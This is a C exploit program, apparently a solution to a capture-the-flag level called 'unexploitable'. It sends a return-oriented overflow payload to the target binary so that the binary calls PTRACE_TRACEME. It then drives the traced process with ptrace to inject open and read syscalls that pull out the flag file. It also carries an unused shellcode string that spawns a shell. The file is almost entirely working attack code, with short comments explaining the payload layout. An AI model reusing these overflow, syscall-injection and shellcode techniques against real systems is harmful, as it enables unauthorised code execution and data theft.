
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>

// the exploit calls to syscall with ptrace and we do PTRACE_TRACEME
// 'A' * 24 -> fill buffer, overwrite rbp
// 0x400511 (8-byte addr) -> return address. This is a pop rbx, pop rbp, ret gadget.
// zero, so rbx and rbp will get the value of 0 (rbx = 0 means PTRACE_TRACEME)
// 0x400560 (8-byte) -> trigger syscall
// + 45 crap bytes, total sum of 101 bytes = PTRACE()!

char exploit[] = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x11, 0x5, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x5, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa };
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

#define SYSCALL_ADDRESS (0x400560)
#define SYS_READ (0)
#define SYS_OPEN (2)
#define SYS_EXECVE (59)
#define __LIBC_START_MAIN_ADDRESS (0x400355)
#define FLAG_STORE_ADDRESS (0x601000)

int run_syscall(pid_t pid, int syscall_number, int first_paramter, int second_parameter, int third_paramter) {
    struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.rip = SYSCALL_ADDRESS;
    regs.rax = syscall_number;
    regs.rdi = first_paramter;
    regs.rsi = second_parameter;
    regs.rdx = third_paramter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

void run_bash_with_ptrace(pid_t pid) {
    wait(NULL);
    struct user_regs_struct regs = { 0 };
    // write flag path into the memory
    ptrace(PTRACE_POKETEXT, pid, __LIBC_START_MAIN_ADDRESS, 0x6e752f656d6f682f);
    ptrace(PTRACE_POKETEXT, pid, __LIBC_START_MAIN_ADDRESS + 8, 0x6174696f6c707865);
    ptrace(PTRACE_POKETEXT, pid, __LIBC_START_MAIN_ADDRESS + 16, 0x67616c662f656c62);
    ptrace(PTRACE_POKETEXT, pid, __LIBC_START_MAIN_ADDRESS + 24, 0);
    run_syscall(pid, SYS_OPEN, __LIBC_START_MAIN_ADDRESS, O_RDONLY, 0);
    wait(NULL);
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    int flag_fd = regs.rax;
    printf("flag fd: %d\n", flag_fd);

    run_syscall(pid, SYS_READ, flag_fd, FLAG_STORE_ADDRESS, 50);
    wait(NULL);
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    printf("read %d bytes\n",  regs.rax);

    long text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS, 0);
    printf("text: %p\n", text);
    text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS + 8, 0);
    printf("text: %p\n", text);
    text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS + 16, 0);
    printf("text: %p\n", text);
    text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS + 24, 0);
    printf("text: %p\n", text);
    text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS + 32, 0);
    printf("text: %p\n", text);
    text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS + 40, 0);
    printf("text: %p\n", text);
    text = ptrace(PTRACE_PEEKTEXT, pid, FLAG_STORE_ADDRESS + 48, 0);
    printf("text: %p\n", text);
}

void main(void) {
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return;
    }

    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

    if (0 == pid) {
        close(pipefd[1]);
        dup2(pipefd[0], 0);
        execl("/home/unexploitable/unexploitable", NULL);
        perror("execl");
    }
    else {
        close(pipefd[0]);
        write(pipefd[1], exploit, sizeof(exploit));
        printf("pid: %d\n", pid);
        run_bash_with_ptrace(pid);
    }
}